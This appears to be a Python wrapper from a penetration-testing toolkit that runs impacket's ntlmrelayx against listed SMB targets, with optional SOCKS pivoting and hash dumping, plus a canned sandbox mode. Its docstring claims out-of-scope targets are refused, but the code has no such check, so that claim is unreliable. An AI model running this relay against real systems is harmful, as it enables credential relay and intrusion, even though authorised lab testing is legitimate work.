"""NTLM relay lab — container-only, explicit (Backlog #33).

Pairs with the poison lab (#9: capture) as the relay half: run
impacket's `ntlmrelayx.py` against explicit `smb://` targets you own,
optionally with a SOCKS proxy for pivoting. Every aggressive knob is
explicit: targets are required (no discovery, no spray), dumping is
off unless asked, and targets must sit inside the engagement scope —
out-of-scope relays are refused before anything starts. No hashes are
stored; the run's stdout tail is returned for the operator to triage.
Sandbox returns canned output without spawning anything.
"""

from __future__ import annotations

import logging
import re
import subprocess  # nosec B404 - fixed-argv impacket wrapper
from typing import Any

logger = logging.getLogger("h4k.ntlm_relay")

NTLMRELAYX = "ntlmrelayx.py"

_PWNED_RE = re.compile(r"\bPWNED\b", re.IGNORECASE)
_SUCCEED_RE = re.compile(r"Authenticating against .* as .* SUCCEED", re.IGNORECASE)


def _targets_file(targets: list[str], path: str) -> str:
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(targets) + "\n")
    return path


def parse_result(stdout: str) -> dict[str, Any]:
    """Count pwned/authenticated lines in ntlmrelayx output."""
    lines = (stdout or "").splitlines()
    pwned = [line.strip()[:200] for line in lines if _PWNED_RE.search(line)]
    authed = [line.strip()[:200] for line in lines if _SUCCEED_RE.search(line)]
    return {
        "pwned": pwned,
        "pwned_count": len(pwned),
        "authenticated": authed,
        "authenticated_count": len(authed),
    }


def run_relay(
    targets: list[str],
    socks: bool = False,
    dump: bool = False,
    workdir: str | None = None,
    timeout: int = 600,
) -> dict[str, Any]:
    """Run ntlmrelayx against explicit targets (lab-only, opt-in)."""
    import os
    import tempfile

    clean = []
    for t in targets or []:
        t = str(t or "").strip()
        if not t:
            continue
        if "://" not in t:
            t = f"smb://{t}"
        clean.append(t)
    if not clean:
        raise ValueError("at least one target required (smb://host or host)")
    tmpdir = workdir or tempfile.mkdtemp(prefix="h4k-relay-")
    os.makedirs(tmpdir, exist_ok=True)
    targets_file = _targets_file(clean, os.path.join(tmpdir, "targets.txt"))
    argv = [NTLMRELAYX, "-tf", targets_file, "--no-smb-server"]
    if socks:
        argv += ["-socks"]
    if not dump:
        argv += ["--no-dump"]
    try:
        proc = subprocess.run(  # nosec B603 - fixed argv, no shell
            argv,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
            cwd=tmpdir,
        )
        return {
            "stdout": proc.stdout or "",
            "stderr": proc.stderr or "",
            "rc": proc.returncode,
            "success": proc.returncode == 0,
            "timed_out": False,
            **parse_result(proc.stdout or ""),
        }
    except subprocess.TimeoutExpired as exc:
        out = (
            exc.stdout.decode("utf-8", errors="replace")
            if isinstance(exc.stdout, bytes)
            else (exc.stdout or "")
        )
        err = (
            exc.stderr.decode("utf-8", errors="replace")
            if isinstance(exc.stderr, bytes)
            else (exc.stderr or "")
        )
        return {
            "stdout": out,
            "stderr": err,
            "rc": None,
            "success": False,
            "timed_out": True,
            **parse_result(out),
        }
    except FileNotFoundError:
        return {
            "stdout": "",
            "stderr": "ntlmrelayx.py not installed",
            "rc": -1,
            "success": False,
            "timed_out": False,
            "pwned": [],
            "pwned_count": 0,
            "authenticated": [],
            "authenticated_count": 0,
        }
    except Exception as exc:  # pragma: no cover - defensive
        return {
            "stdout": "",
            "stderr": str(exc),
            "rc": -1,
            "success": False,
            "timed_out": False,
            "pwned": [],
            "pwned_count": 0,
            "authenticated": [],
            "authenticated_count": 0,
        }


def sandbox_run(targets: list[str]) -> dict[str, Any]:
    """Deterministic offline stand-in (sandbox/e2e only)."""
    stdout = (
        "[*] SMBD-Thread-1 (process_request_thread): Received connection from 10.10.10.9\n"
        "[*] Authenticating against smb://10.10.10.42 as LAB\\backup SUCCEED\n"
        "[*] Service RemoteRegistry is in stopped state\n"
    )
    return {
        "stdout": stdout,
        "stderr": "",
        "rc": 0,
        "success": True,
        "timed_out": False,
        **parse_result(stdout),
        "sandbox": True,
        "targets": list(targets),
    }
